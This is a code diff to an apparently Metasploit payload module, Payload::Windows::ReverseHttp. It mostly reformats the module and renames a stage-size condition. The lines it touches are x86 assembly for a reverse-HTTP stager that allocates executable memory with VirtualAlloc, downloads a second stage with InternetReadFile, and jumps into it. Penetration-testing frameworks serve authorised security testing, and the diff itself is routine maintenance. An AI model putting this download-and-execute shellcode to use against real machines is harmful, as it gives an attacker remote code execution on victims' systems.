@@ -447,9 +447,8 @@ module Payload::Windows::ReverseHttp
       ^
     end
 
-
-    if defined?(dynamic_stage_size?) && dynamic_stage_size?
-    asm << %Q^
+    if defined?(read_stage_size?) && read_stage_size?
+      asm << %Q^
     allocate_memory:
     read_stage_size:
       push ebx               ; temporary storage for stage size
@@ -464,10 +463,8 @@ module Payload::Windows::ReverseHttp
       call ebp               ; InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead)
       pop ebx                ; bytesRead (unused, pop for cleaning)
       pop ebx                ; stage size
-
       test eax,eax           ; download failed? (optional?)
       jz failure
-
       xor eax, eax
       push 0x40              ; PAGE_EXECUTE_READWRITE
       push 0x1000            ; MEM_COMMIT
@@ -475,13 +472,11 @@ module Payload::Windows::ReverseHttp
       push eax               ; NULL as we dont care where the allocation is
       push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
       call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
-
     download_prep:
       xchg eax, ebx          ; place the allocated base address in ebx
       push ebx               ; store a copy of the stage base address on the stack (for ret later)
       push ebx               ; temporary storage for bytes read count
       mov edi, esp           ; &bytesRead
-
     download_more:
       push edi               ; &bytesRead
       push eax               ; read length
@@ -492,12 +487,10 @@ module Payload::Windows::ReverseHttp
       test eax,eax           ; download failed? (optional?)
       jz failure
       pop eax                ; clear the temporary storage for bytesread
-
     ^
     else
-    asm << %Q^
+      asm << %Q^
     allocate_memory:
-      xor eax, eax
       push 0x40              ; PAGE_EXECUTE_READWRITE
       push 0x1000            ; MEM_COMMIT
       push 0x00400000        ; Stage allocation (4Mb ought to do us)
@@ -527,10 +520,9 @@ module Payload::Windows::ReverseHttp
 
       test eax,eax           ; optional?
       jnz download_more      ; continue until it returns 0
-      pop eax                ; clear the temporary storage for bytesread
-    ^
-    end
-
+      pop eax                ; clear the temporary storage
+      ^
+      end
     asm << %Q^
     execute_stage:
       ret                    ; dive into the stored stage address
